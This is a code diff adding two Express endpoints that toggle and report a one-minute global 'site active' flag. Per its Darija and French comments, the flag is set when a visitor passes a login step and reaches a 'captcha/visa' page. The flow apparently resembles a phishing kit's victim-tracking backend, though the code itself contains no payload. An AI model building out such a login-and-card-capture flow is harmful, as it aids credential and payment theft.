@@ -352,6 +352,14 @@ app.get('/api/status', (req, res) => {
 
 
 
+
+
+
+
+
+
+
+
 // Nouveau modèle pour stocker les "activations"
 const ActiveSchema = new mongoose.Schema({
   page: String,
@@ -381,6 +389,46 @@ app.get("/active", async (req, res) => {
     return res.status(500).json({ error: "Server error" });
   }
 });
+
+// --- Login control state ---
+let siteIsActive = false; // حالة عامة فالذاكرة
+
+// Endpoint: لما الكلاينت يوصل للـ captcha/visa → يعيط على /active
+app.post("/active", (req, res) => {
+  siteIsActive = true; // نعلمو أن الموقع فات login
+  console.log("✅ /active reçu → siteIsActive = true");
+
+  res.json({ success: true, message: "Active reçu ✅" });
+
+  // نرجعو الحالة لـ false بعد 1 دقيقة باش مايبقاش ديما شغّال
+  setTimeout(() => {
+    siteIsActive = false;
+    console.log("ℹ️ siteIsActive reset → false");
+  }, 60 * 1000);
+});
+
+// Endpoint: اللي كيتشيكو منو geterore()
+app.get("/check-login-error", (req, res) => {
+  if (siteIsActive) {
+    return res.sendStatus(200); // OK → login تعدّى
+  } else {
+    return res.sendStatus(500); // مازال
+  }
+});
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
